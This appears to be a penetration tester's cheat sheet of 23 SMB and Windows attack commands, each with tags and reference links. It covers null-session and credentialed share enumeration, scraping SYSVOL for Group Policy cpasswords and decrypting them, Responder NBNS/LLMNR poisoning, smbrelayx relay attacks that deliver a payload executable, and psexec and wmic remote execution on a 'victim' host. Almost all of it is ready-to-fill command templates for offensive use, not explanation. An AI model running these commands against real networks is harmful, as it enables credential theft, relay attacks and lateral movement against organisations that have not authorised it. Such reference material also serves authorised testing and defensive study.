### 1. Null session smb
```
smbclient -I [IP] -L [domain] -N -U ""
```
**- linux,bash,smb**
#### References:

https://www.cyberciti.biz/faq/access-windows-shares-from-linux/
https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
__________
### 2. loop to find user shares
```
for host in $(cat ../nmap/[IP File]); do echo "Trying $host"; smbclient -L $host -U  [DOM]/[USER]%'[PASS]'; done
```
**- linux,bash,loop,enumeration,smb**
#### References:

https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
https://yg.ht
__________
### 3. loop for who is where
```
for host in $(cat userhosts.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host 'WMIC ComputerSystem Get UserName'; done | tee loggedin-dirty.txt;cat loggedin-dirty.txt | grep -v "^\[" | grep -v "^Impacket" | grep -v "^Trying" | grep -v "SMB SessionError" | sed '/^$/d'
```
**- loop,enumeration,user information,smb,impacket**
#### References:

https://yg.ht
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 4. Mount Sysvol share (hosted on the DC)
```
mount -t cifs \\\\[victim]\\SYSVOL -o username=[user],password=[password] mount/; nautilus mount/;
```
**- linux,files,smb,filesystem**
#### References:

https://www.cyberciti.biz/faq/linux-mount-cifs-windows-share/
__________
### 5. Look in 'mount' for share (mount sysvol first)
```
egrep -r "cpassword|net" mount
```
**- linux,enumeration,smb**
#### References:

https://blogs.technet.microsoft.com/ash/2014/11/10/dont-set-or-save-passwords-using-group-policy-preferences/
__________
### 6. RPCClient smb show users and groups
```
rpcclient -U '[DOMAIN]\[USER]'%'[PASS]' '[TARGET]' -c enumdomusers,enumdomgroups
```
**- linux,enumeration,user information,smb**
#### References:

https://www.samba.org/samba/docs/man/manpages/rpcclient.1.html
__________
### 7. NBTScan
```
nbtscan -v -s : 192.168.0.0/24 >> nbtscan-[SUBNET].txt
```
**- linux,scanning,smb**
#### References:

https://yg.ht
http://unixwiz.net/tools/nbtscan.html
__________
### 8. NBTScan en masse
```
for a in {0..254}; do nbtscan -v -s : 192.168.$a.0/24 >> nbtscan-192.168.$a.txt; done
```
**- linux,loop,scanning,smb**
#### References:

https://yg.ht
http://unixwiz.net/tools/nbtscan.html
__________
### 9. smbrelay targeted
```
smbrelayx.py -h [TARGETIP] -e [PAYLOAD exe]
```
**- linux,smb,MitM,Windows,impacket,privilege escalation**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 10. smbrelay reflection : note read into http -> smb refelction
```
smbrelayx.py -e [PAYLOAD exe]
```
**- linux,smb,MitM,Windows,impacket,privilege escalation**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 11. responder NBNS LLMNR
```
/data/hacking/Responder/Responder.py -I eth0 -wrfFd --lm -i [YOUR IP]
```
**- linux,passwords,smb,MitM,privilege escalation**
#### References:

https://github.com/SpiderLabs/Responder
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
__________
### 12. List smb shares on a target host domain and pass are optional, % seperates user from pass
```
smbclient -L [TARGET] -U [DOM]/[USER]%'[PASS]'
```
**- linux,enumeration,smb**
#### References:

https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
__________
### 13. Get a listing of all users and groups for targeting your post exploitation
```
enum4linux.pl -a -u [USER] -p [PASS] [TARGET] | tee [CLIENTNAME].domainenum
```
**- linux,enumeration,user information,smb**
#### References:

https://labs.portcullis.co.uk/tools/enum4linux/
__________
### 14. Get a list of all the users in the domain from a full dump
```
cat [CLIENTNAME].domainenum | grep "^user" | cut -d ":" -f 2 | cut -d "]" -f 1 | cut -d "[" -f 2 > userlist.txt
```
**- linux,enumeration,user information,smb**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 15. nmap smb signing
```
nmap --script smb-security-mode.nse -p445 -iL [hostsfile] -oA nmap-SMBSigning
```
**- linux,networking,scanning,smb,MitM**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 16. active sessions
```
net session
```
**- enumeration,smb,Windows**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/bb490712.aspx
__________
### 17. Share a directory with the world, probably don't want the world
```
net share [sharename] [folder] /GRANT:Everyone,FULL
```
**- files,smb,Windows**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/bb490712.aspx
__________
### 18. execute command on remote host from remote smb share
```
wmic /node:[victim] /user:[domain]\[user] /password:[password] process call create "\\[host]\[share]\[exe]"
```
**- smb,Windows,remote command shell**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 19. powershell mount remote share : think sysinternals remote share
```
New-PSDrive -Persist -PSProvider FileSjstem -Root \\[ip]\tools -Name i
```
**- files,smb,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/new-psdrive
__________
### 20. Mapped drives in reg
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU
```
**- enumeration,smb,Windows,forensics**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
__________
### 21. Do a netbios name query.
```
nmblookup [name]
```
**- linux,scanning,smb**
#### References:

http://linuxcommand.org/man_pages/nmblookup1.html
__________
### 22. mount a share within windows
```
net use z:\ \\[ip]\[share] /user:[domain]\[username] [password] /p:no [password]
```
**- smb,Windows**
#### References:

https://technet.microsoft.com/en-us/library/bb490717.aspx
__________
### 23. Decrypt group policy preferences password aka Cpassword, use LAPS not GPP
```
/usr/bin/gpp-decrypt [cpassword]
```
**- smb,privilege escalation,hashes**
#### References:

http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html
__________
